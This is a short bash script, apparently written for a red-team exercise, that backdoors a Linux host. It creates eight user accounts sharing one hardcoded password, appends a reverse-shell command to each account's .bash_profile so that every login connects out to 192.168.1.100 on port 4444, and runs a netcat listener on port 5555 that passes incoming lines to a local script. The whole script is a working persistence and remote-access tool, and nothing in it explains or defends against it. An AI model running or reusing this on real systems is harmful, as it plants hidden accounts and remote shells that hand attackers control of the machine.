#!/bin/bash

usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")

for username in "${usernames[@]}"; do
    # Create red team users
    useradd "$username"
    # Set passwords for red team users
    echo "$username:aTerg0Lupi!" | chpasswd
    # Spawn reverse shell in each user's bash profile
    echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >> "/home/$username/.bash_profile"
    nc -lvnp 5555 | while read line; do
        /etc/System-Clock/chronos-broadcast.sh "$line"
    done
done
